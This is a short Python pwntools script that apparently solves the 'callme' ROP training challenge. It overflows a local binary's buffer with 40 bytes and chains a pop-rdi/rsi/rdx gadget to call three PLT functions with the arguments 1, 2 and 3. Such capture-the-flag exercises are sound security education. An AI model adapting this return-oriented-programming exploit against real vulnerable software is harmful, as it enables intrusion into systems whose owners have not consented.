#!/usr/bin/python

from pwn import *

s = process('./callme')
s.clean()

# 0x0000000000401850  callme_one@plt
# 0x0000000000401870  callme_two@plt
# 0x0000000000401810  callme_three@plt
callme_one = 0x401850
callme_two = 0x401870
callme_three = 0x401810

# 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
pop_rdi_pop_rsi_pop_rdx = 0x401ab0

payload = 'A' * 40
payload += p64(pop_rdi_pop_rsi_pop_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_one)

payload += p64(pop_rdi_pop_rsi_pop_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_two)

payload += p64(pop_rdi_pop_rsi_pop_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_three)

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+81
""")
'''

s.sendline(payload)

s.interactive()




